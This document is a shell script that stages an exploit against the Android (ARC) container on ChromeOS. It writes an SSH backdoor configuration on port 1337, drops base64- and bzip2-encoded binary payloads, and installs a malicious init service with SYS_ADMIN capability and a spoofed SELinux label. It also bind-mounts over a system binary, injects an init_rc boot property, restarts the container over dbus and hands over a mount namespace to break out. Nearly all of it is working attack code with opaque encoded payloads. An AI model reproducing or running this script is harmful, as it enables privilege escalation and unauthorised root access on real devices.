











echo "Staging ssh..."
ssh-keygen -f /tmp/ssh_host_rsa_key -N '' -t rsa >/dev/null
mkdir /tmp/root/
cp /tmp/ssh_host_rsa_key.pub /tmp/root/k
cat > /tmp/sshd_config <<-EOF
AuthorizedKeysFile /tmp/%u/k
StrictModes no
HostKey /tmp/ssh_host_rsa_key
Port 1337
EOF
rm -f /home/chronos/user/.ssh/known_hosts

rm -rf /run/chrome/init /run/chrome/nsexit /run/chrome/exploit.sock

echo "Dropping assets..."
base64 -d <<-EOF | bunzip2 -dc > /tmp/init.tar
QlpoOTFBWSZTWRgLySEABGJ/////////////////////////////////////////////4BJfHvj31uN31m9t0fetrPm33fe19Xbe
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
EOF
tar xf /tmp/init.tar -C /run/chrome

base64 -d <<-EOF | bunzip2 -dc > /run/chrome/nsexit
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
db2kmxp6WlpeaKz/xdyRThQkP2yDqAA=
EOF

cat > /run/chrome/init/exploit.rc <<EOF
# stop the container from crashing
import /init.rc

service exploit /system/bin/runcon u:r:cros_browser:s0 /dev/exploit firstrun
        class main
        oneshot
        disabled
        capabilities SYS_ADMIN
        seclabel u:r:modprobe:s0

on early-init
        copy /var/run/chrome/init/exploit.sh /dev/exploit
        chmod 755 /dev/exploit

	# for the overmount later
	copy /system/bin/toybox /dev/toybox
	chmod 755 /dev/toybox

        start exploit
EOF

cat > /run/chrome/init/exploit.sh <<EOF
#!/system/bin/sh
# toybox is the real touch binary, mount doesn't like symlinks
[ \$0 = "/dev/exploit" ] && /vendor/bin/mount -o bind /dev/exploit /system/bin/toybox
[ \$0 = "/system/bin/touch" ] && cp /var/run/chrome/nsexit /dev/nsexit && chmod +x /dev/nsexit && /dev/nsexit &
exec /dev/toybox \${0##*/} \$@
EOF

echo "Configuring default.prop..."
echo "ro.boot.init_rc=/var/run/chrome/init" >> /run/arc/host_generated/default.prop

echo "Triggering Arc restart..."
dbus-send --print-reply --system --dest=org.chromium.SessionManager /org/chromium/SessionManager org.chromium.SessionManagerInterface.StopArcInstance string:${CROS_USER_ID_HASH} boolean:false > /dev/null

echo "Waiting for listener..."
sleep 10
exec 8</proc/self/ns/mnt
echo "Sending ns mount..."
dbus-send --bus=unix:path=/run/chrome/exploit.sock --type=method_call / com.exploit.method fd:8 >/dev/null

sleep 2

echo "Connecting to ssh..."
